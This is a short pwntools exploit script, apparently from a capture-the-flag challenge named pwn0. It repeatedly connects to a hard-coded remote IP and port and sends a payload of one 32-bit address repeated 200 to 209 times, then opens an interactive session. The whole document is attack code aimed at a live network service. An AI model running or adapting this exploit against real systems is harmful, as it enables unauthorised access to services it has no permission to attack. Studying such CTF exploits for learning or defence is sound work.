from pwn import *
debug = False
#p = process("./pwn0")
#p = remote("106.75.18.19",23333)
if debug:
	gdb.attach(p,"debug")
ptr=0x804A080
for i in range(200, 210):
	p = remote("106.75.18.19",23333)
	payload = p32(ptr)*i
	p.recvuntil("input the flag!")
	p.send(payload)
	p.interactive()